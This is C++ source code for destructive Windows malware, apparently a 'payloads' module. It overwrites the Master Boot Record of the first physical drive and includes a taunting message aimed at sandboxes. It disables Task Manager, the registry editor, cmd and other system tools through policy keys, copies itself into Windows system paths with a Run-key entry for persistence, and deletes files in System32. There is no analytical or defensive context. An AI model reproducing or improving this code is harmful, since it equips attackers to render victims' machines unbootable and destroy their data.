#include "PAYLOADPTR.h"
#include "MBR_BUFFER.h"


typedef HANDLE HFINDFILE;

namespace Payloads {
	
	INT OverwriteMBR(VOID) {
		DWORD UNUSED;
		HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		INT writeMBR = WriteFile(hFile, cbRawData, 512, &UNUSED, NULL);
		if (!writeMBR) {
			MessageBoxW(NULL, L"That god-damned sandbox again.", L"Diddy party", MB_OK);
			exit(0);
		}
		CloseHandle(hFile);
	}
	
	DWORD DisableSystemTools(VOID) {
		LPCWSTR lpcwArray[] = {
			L"NoRun", L"NoControlPanel", L"NoLogoff", L"DisableChangePassword"
		};
		for (INT i = 0; i < 4; i++) {
			Call::RegistryW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\SYSTEM", L"DisableTaskMgr", REG_DWORD, 1, NULL, FALSE);
			Call::RegistryW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\SYSTEM", L"DisableRegistryTools", REG_DWORD, 1, NULL, FALSE);
			Call::RegistryW(HKEY_CURRENT_USER, L"SOFTWARE\\policies\\Microsoft\\Windows\\SYSTEM", L"DisableCmd", REG_DWORD, 1, NULL, FALSE);
			Call::RegistryW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\EXPLORER", lpcwArray[i], REG_DWORD, 1, NULL, FALSE);
		}
	}
	
	INT InfectSystem(VOID) {
		LPCWSTR lpcwArray[] = {
			L"C:\\WINDOWS\\convex.exe",
			L"C:\\WINDOWS\\System32\\conv.exe",
			L"C:\\WINDOWS\\System32\\oobe\\NI.exec",
			L"C:\\winload.dat"
		};
		for (INT i = 0; i < 4; i++) {
			Call::ExtCopyFile(GetDirW(), lpcwArray[i], FILE_ATTRIBUTE_SYSTEM);
			Call::RegistryW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RUN", L"Shape Convex", REG_SZ, 0, lpcwArray[3], TRUE);
		}
	}
	
	INT DeleteFiles(VOID) {
		WIN32_FIND_DATAW lpFindFileData;
		HFINDFILE hFindFile = FindFirstFileW(L"C:\\WINDOWS\\System32\\*.*", &lpFindFileData);
		while (FindNextFileW(hFindFile, &lpFindFileData)) {
			if (lpFindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) DeleteFileW(lpFindFileData.cFileName);
		}
		FindClose(hFindFile);
	}
	
	DWORD WINAPI MoveWindowsAndCursor(LPVOID lpThreadParam) {
		RECT rect;
		INT x = GetSystemMetrics(0) / 2, y = GetSystemMetrics(1) / 2;
		INT incrementX = 10, incrementY = 10;
		while (TRUE) {
			GetWindowRect(GetForegroundWindow(), &rect);
			x += incrementX, y += incrementY;
			SetWindowPos(GetForegroundWindow(), NULL, x, y, x, y, SWP_NOSIZE);
			SetCursorPos(x - 180, y - 180);
			if (x < 0 || x > w) incrementX = -incrementX;
			if (y < 0 || y > h) incrementY = -incrementY;
			Sleep(10);
		}
	} // this wasn't used.
}
